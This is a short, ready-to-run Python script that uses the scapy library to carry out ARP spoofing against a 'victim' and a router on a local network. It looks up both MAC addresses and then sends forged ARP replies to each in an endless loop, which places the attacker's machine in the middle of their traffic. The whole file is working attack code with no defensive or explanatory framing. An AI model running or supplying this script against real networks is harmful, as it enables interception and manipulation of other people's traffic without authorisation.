from scapy.all import ARP, Ether, sendp, getmacbyip
import time

# Replace with actual IP addresses
target_ip = "192.168.X.X"  # Victim's IP
gateway_ip = "192.168.X.X"  # Router's IP

def get_mac(ip):
    """Get the MAC address for the given IP."""
    mac = getmacbyip(ip)
    if not mac:
        raise ValueError(f"Could not resolve MAC for {ip}")
    return mac

def spoof_arp(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    # Create ARP packets wrapped in Ethernet frames
    packet_to_target = Ether(dst=target_mac) / ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    packet_to_gateway = Ether(dst=gateway_mac) / ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)

    print("Spoofing started... Press Ctrl+C to stop.")
    try:
        while True:
            sendp(packet_to_target, verbose=False)
            sendp(packet_to_gateway, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nStopped ARP spoofing.")

if __name__ == "__main__":
    try:
        spoof_arp(target_ip, gateway_ip)
    except ValueError as e:
        print(f"Error: {e}")
